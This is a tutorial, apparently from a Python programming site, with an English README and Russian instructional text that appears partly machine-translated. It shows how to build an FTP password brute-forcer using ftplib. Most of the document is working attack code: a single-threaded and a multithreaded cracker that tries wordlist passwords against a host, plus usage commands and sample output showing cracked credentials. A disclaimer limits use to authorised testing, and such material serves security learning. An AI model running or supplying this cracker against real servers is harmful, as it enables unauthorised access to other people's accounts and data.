# [How to Brute Force FTP Servers in Python](https://www.thepythoncode.com/article/brute-force-attack-ftp-servers-using-ftplib-in-python)
To run this:
- `pip3 install -r requirements.txt`
- Use `ftp_cracker.py` for fast brute force:
    ```
    python ftp_cracker.py --help
    ```
    **Output:**
    ```
    usage: ftp_cracker.py [-h] [-u USER] [-p PASSLIST] [-t THREADS] host

    FTP Cracker made with Python

    positional arguments:
    host                  The target host or IP address of the FTP server

    optional arguments:
    -h, --help            show this help message and exit
    -u USER, --user USER  The username of target FTP server
    -p PASSLIST, --passlist PASSLIST
                            The path of the pass list
    -t THREADS, --threads THREADS
                            Number of workers to spawn for logining, default is 30
    ```
- If you want to use the wordlist `wordlist.txt` in the current directory against the host `192.168.1.2` (can be domain or private/public IP address) with the user `user`:
    ```
    python ftp_cracker.py 192.168.1.2 -u user -p wordlist.txt
    ```
- You can also tweak the number of threads to spawn (can be faster, default is 30):
    ```
    python ftp_cracker.py 192.168.1.2 -u user -p wordlist.txt --threads 35
    ```
- Output can be something like this:
    ```
    [!] Trying 123456
    [!] Trying 12345
    ...
    [!] Trying sweety
    [!] Trying joseph
    [+] Found credentials:
            Host: 192.168.1.113
            User: test
            Password: abc123
    ```
##
# [[] / []]()
Атака методом перебора состоит из атаки, которая отправляет много паролей с надеждой угадать правильно. В этом уроке вы узнаете, как вы можете перебор FTP-серверов в Python.

Мы будем использовать модуль ftplib, встроенный в Python. Тем не менее, мы собираемся использовать colorama для печати в цветах в Python:

pip3 install colorama
Получите: Создайте 24 этических хакерских скрипта и инструмента с помощью Python Book

Теперь, в демонстрационных целях, я настроил FTP-сервер в моей локальной сети на машине, которая работает под управлением Linux. Точнее, я установил vsftpd (очень безопасный FTP-демон), который является FTP-сервером для Unix-подобных систем. Если вы хотите сделать это тоже, вот команды, которые я использовал, чтобы подготовить его:

root@rockikz:~# sudo apt-get update
root@rockikz:~# sudo apt-get install vsftpd
root@rockikz:~# sudo service vsftpd start
А затем убедитесь, что у вас есть пользователь, и конфигурация local_enable=YES установлена в файле /etc/vsftpd.conf.

Давайте начнем:

import ftplib
from colorama import Fore, init # for fancy colors, nothing else

# init the console for colors (Windows)
# init()
# hostname or IP address of the FTP server
host = "192.168.1.113"
# username of the FTP server, root as default for linux
user = "test"
# port of FTP, aka 21
port = 21
Итак, локальный сервер расположен по адресу 192.168.1.113, я также создал логин "test", а затем мы указываем порт FTP, который равен 21.

Теперь давайте запишем основную функцию, которая принимает пароль в аргументах и возвращает правильность учетных данных:

def is_correct(password):
    # initialize the FTP server object
    server = ftplib.FTP()
    print(f"[!] Trying", password)
    try:
        # tries to connect to FTP server with a timeout of 5
        server.connect(host, port, timeout=5)
        # login using the credentials (user & password)
        server.login(user, password)
    except ftplib.error_perm:
        # login failed, wrong credentials
        return False
    else:
        # correct credentials
        print(f"{Fore.GREEN}[+] Found credentials:", password, Fore.RESET)
        return True
Получите: Создайте 24 этических хакерских скрипта и инструмента с помощью Python Book

Ничего особенного; инициализируем объект FTP-сервера с помощью ftplib. FTP(), а затем мы подключаемся к этому хосту и пытаемся войти в систему, это вызовет исключение всякий раз, когда учетные данные неправильны, поэтому, если оно будет поднято, мы просто вернем False и True в противном случае.

Мы будем использовать список известных паролей. Не стесняйтесь использовать любой, или вы можете создать свой собственный пользовательский список слов с помощью Crunch. Однако в этом уроке мы будем использовать список паролей Nmap, который содержит около 5000 паролей. Если вы используете Kali Linux, он находится в "/usr/share/wordlists/nmap.lst". В противном случае получите его здесь.

Как только он у вас есть, поместите его в текущий каталог и назовите его wordlist.txt и используйте следующий код:

# read the wordlist of passwords
passwords = open("wordlist.txt").read().split("\n")
print("[+] Passwords to try:", len(passwords))
Теперь все, что нам нужно сделать, это запустить вышеуказанную функцию для всех этих паролей:

# iterate over passwords one by one
# if the password is found, break out of the loop
for password in passwords:
    if is_correct(password):
        break
Теперь этот код в порядке, но он очень медленный. Он использует только один поток, который пытается установить FTP-соединение для каждого пароля последовательно.

Связанные с: Как сделать сканер поддоменов в Python.

Давайте использовать потоки для ускорения этого процесса; Следующий код является полным, использующим многопоточность:

import ftplib
from threading import Thread
import queue
from colorama import Fore, init # for fancy colors, nothing else

# init the console for colors (for Windows)
# init()
# initialize the queue
q = queue.Queue()
# number of threads to spawn
n_threads = 30
# hostname or IP address of the FTP server
host = "192.168.1.113"
# username of the FTP server, root as default for linux
user = "test"
# port of FTP, aka 21
port = 21

def connect_ftp():
    global q
    while True:
        # get the password from the queue
        password = q.get()
        # initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # tries to connect to FTP server with a timeout of 5
            server.connect(host, port, timeout=5)
            # login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            pass
        else:
            # correct credentials
            print(f"{Fore.GREEN}[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # we found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # notify the queue that the task is completed for this password
            q.task_done()

# read the wordlist of passwords
passwords = open("wordlist.txt").read().split("\n")
print("[+] Passwords to try:", len(passwords))
# put all passwords to the queue
for password in passwords:
    q.put(password)
# create `n_threads` that runs that function
for t in range(n_threads):
    thread = Thread(target=connect_ftp)
    # will end when the main thread end
    thread.daemon = True
    thread.start()
# wait for the queue to be empty
q.join()
Great, it is quite similar to the previous one, but we are using a queue here that is filled with the list of passwords in the beginning, and in the core function that's executed by those daemon threads, we're getting a password from the queue and try to login with it. If the password is correct, then we need to finish brute-forcing, a safe way to do that is to clear the queue, and that's what we're doing.

If you're unsure how to use threading with queues, check this tutorial for detailed information.

We also used daemon threads, so these threads will end when the main thread ends.

Вот небольшой скриншот после моей попытки на моем локальном компьютере:

Пример вывода FTP-серверов с перебором в PythonДовольно круто, мы закончили! Теперь попробуйте повозиться с параметром n_threads и посмотреть, сможете ли вы еще больше улучшить скорость взломщика.

ОТКАЗ от ответственности: Используйте эту атаку на компьютере, на тестирование которого у вас есть разрешение. В противном случае мы не несем ответственности за любой вред, который вы причиняете кому-либо.